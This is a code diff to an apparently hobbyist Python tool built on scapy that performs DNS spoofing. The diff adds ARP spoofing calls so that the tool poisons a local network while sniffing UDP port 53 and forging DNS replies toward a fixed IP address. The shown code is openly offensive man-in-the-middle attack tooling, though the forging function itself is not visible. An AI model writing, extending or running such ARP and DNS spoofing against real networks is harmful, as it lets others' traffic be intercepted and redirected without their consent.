@@ -1,5 +1,6 @@
 import scapy.all as scapy
 import threading
+import arp_spoofing
 
 destination_ip = "142.250.179.174" #what to spoof the ip to (google.com)
 
@@ -40,10 +41,13 @@ def dns_spoof(packet):
 def dns_main_loop():
     while dns_spoofing:
         #continuously sniff and respond to dns packets (udp port 53 is used for dns)
-        scapy.sniff(filter="udp port 53", prn=dns_spoof)
+        arp_spoofing.arp_main_tick()
+        scapy.sniff(filter="udp port 53", prn=dns_spoof, timeout = 5)
     
 
 def dns_main():
     #on a thread we sniff for dns packets and respond with a spoofed response
-    dns_spoofing_thread = threading.Thread(target=dns_main_loop)
-    dns_spoofing_thread.start()
+    arp_spoofing.arp_main_automated()
+    #dns_spoofing_thread = threading.Thread(target=dns_main_loop)
+    #dns_spoofing_thread.start()
+    dns_main_loop()
